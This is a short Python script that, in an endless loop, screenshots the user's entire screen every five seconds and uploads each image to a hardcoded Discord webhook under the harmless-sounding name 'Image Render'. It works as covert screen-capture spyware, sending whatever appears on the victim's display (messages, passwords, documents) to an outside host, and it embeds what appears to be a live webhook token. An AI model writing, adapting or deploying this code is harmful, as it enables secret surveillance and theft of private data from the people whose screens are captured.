from discord_webhook import DiscordWebhook
from time import sleep, time
import os
import pyautogui


HOOKtemplate = 'https://discord.com/api/webhooks/'
uri = HOOKtemplate + '959774283591221268/ef1oo8SOHlgOb3wpmI_zuNC63I72OAqyiTmpYqGWZMb24UUGENM7YJwCVHaQ0GcF90Nm'

while 1:
	webhook = DiscordWebhook(url=uri, username=f"Image Render [{time()}]",
		avatar_url="https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png",
		content= f"{int(time())}")

	pic = pyautogui.screenshot()
	pic.save(f'{os.getenv("temp")}/rSHOT.png')

	with open(f'{os.getenv("temp")}/rSHOT.png', "rb") as f:
		# webhook.add_file(file=f.read(), filename=f'{time()}.png')
		webhook.add_file(file=f.read(), filename=f'time.png')

	response = webhook.execute()
	print(response)

	sleep(5)
